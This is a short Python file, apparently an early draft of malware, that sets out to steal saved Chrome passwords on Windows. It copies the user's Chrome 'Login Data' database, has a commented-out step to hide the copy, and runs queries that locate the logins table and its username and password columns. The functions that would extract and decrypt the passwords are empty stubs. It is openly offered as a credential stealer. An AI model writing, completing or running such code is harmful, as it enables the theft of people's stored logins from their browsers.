import os
import sqlite3

def sql_access():
    """ Returns a SQLite3 connection to a copy of the credentials database """
    CHROME_PATH = os.getenv('localappdata') + r"\Google\Chrome\User Data\Default"
    ORIGINAL_DB_PATH = CHROME_PATH + r'\Login Data'
    DB_PATH = CHROME_PATH + r'\db'

    # Copy original sqlite3 database to access it without killing active Chrome processes
    with open(ORIGINAL_DB_PATH, 'rb') as f_in, open(DB_PATH, 'wb') as f_out:
        db_bytes = f_in.read()
        f_out.write(db_bytes)
    # Hide file
    # os.system(f'attrib +h "{DB_PATH}"')

    # Return connection
    db_connection = sqlite3.connect(DB_PATH)
    return db_connection


def sqli_recon(db_connection):
    """ SQL queries to learn more about the database structure """
    # To find tables
    cursor = db_connection.cursor()
    cursor.execute('SELECT name FROM sqlite_master WHERE type="table"')
    print(cursor.fetchall())
    # Table of interest: logins

    # To find columns for logins table
    cursor.execute('PRAGMA table_info(logins)')
    print(cursor.fetchall())
    # Columns of interest: action_url, username_value, password_value 


def extract_credentials(db_connection):
    """ Extracts user credentials from a SQLite3 connection """
    pass


def decrypt_passwords(data):
    """ Decrypts the encrypted passwords from data """
    pass


def windows_stealer():
    """ Steals Chrome Credentials from a Windows machine """
    # Access SQL Database
    db_connection = sql_access()

    # SQL recon
    # sqli_recon(db_connection)

    # Extract credentials
    data = extract_credentials(db_connection)

    # Decrypt passwords
    decrypt_passwords(data)

    # delete temp file?


if __name__ == '__main__':
    windows_stealer()
